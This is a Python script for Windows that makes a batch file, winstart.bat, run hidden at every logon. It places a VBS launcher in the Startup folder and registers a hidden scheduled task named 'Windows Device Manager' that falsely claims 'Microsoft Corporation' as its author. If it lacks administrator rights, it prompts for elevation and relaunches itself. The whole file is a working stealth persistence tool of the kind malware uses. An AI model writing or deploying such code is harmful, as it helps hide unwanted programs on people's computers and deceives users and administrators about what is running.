import os
import sys
import ctypes
import shutil
import win32com.client
from datetime import datetime, timedelta


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def set_autorun_script(script_path):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    if not os.path.exists(startup_folder):
        os.makedirs(startup_folder)

    script_name = os.path.basename(script_path)
    vbs_path = os.path.join(startup_folder, script_name.replace('.bat', '.vbs'))

    vbs_content = f"""
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "{script_path}" & chr(34), 0
Set WshShell = Nothing
    """
    with open(vbs_path, 'w') as vbs_file:
        vbs_file.write(vbs_content.strip())

    if os.path.exists(vbs_path):
        print(f"{vbs_path} is already set to run at startup.")
    else:
        print(f"{vbs_path} has been set to run at startup.")


def create_task_scheduler_entry(script_path):
    task_name = "Windows Device Manager"
    script_name = os.path.basename(script_path)
    vbs_path = script_path.replace('.bat', '.vbs')

    vbs_content = f"""
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "{script_path}" & chr(34), 0
Set WshShell = Nothing
    """
    with open(vbs_path, 'w') as vbs_file:
        vbs_file.write(vbs_content.strip())

    scheduler = win32com.client.Dispatch('Schedule.Service')
    scheduler.Connect()

    root_folder = scheduler.GetFolder('\\')
    task_def = scheduler.NewTask(0)

    # Create a trigger that starts the task at logon
    trigger = task_def.Triggers.Create(1)  # 1 means TASK_TRIGGER_LOGON
    trigger.StartBoundary = (datetime.now() + timedelta(minutes=1)).strftime(
        "%Y-%m-%dT%H:%M:%S")  # Set start boundary to 1 minute from now

    # Create the action that will run the script
    action = task_def.Actions.Create(0)  # 0 means TASK_ACTION_EXEC
    action.Path = vbs_path

    # Set task parameters
    task_def.RegistrationInfo.Description = "Windows Device Control Manager"
    task_def.Principal.LogonType = 3  # 3 means TASK_LOGON_INTERACTIVE_TOKEN
    task_def.Settings.Enabled = True
    task_def.Settings.Hidden = True
    task_def.RegistrationInfo.Author = "Microsoft Corporation"
    task_def.Settings.StopIfGoingOnBatteries = False

    root_folder.RegisterTaskDefinition(
        task_name,
        task_def,
        6,  # 6 means TASK_CREATE_OR_UPDATE
        None,
        None,
        3  # 3 means TASK_LOGON_INTERACTIVE_TOKEN
    )

    print(f"Task Scheduler entry for {script_name} created successfully.")


def main():
    script_path = os.path.join(os.getcwd(), 'winstart.bat')
    if not os.path.isfile(script_path):
        print(f"Error: {script_path} does not exist.")
        return

    if is_admin():
        set_autorun_script(script_path)
        create_task_scheduler_entry(script_path)
    else:
        print("This script requires administrative privileges to set the startup script.")
        if sys.version_info[0] == 3 and sys.version_info[1] >= 5:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        else:
            print("Please run this script as an administrator.")


if __name__ == "__main__":
    main()
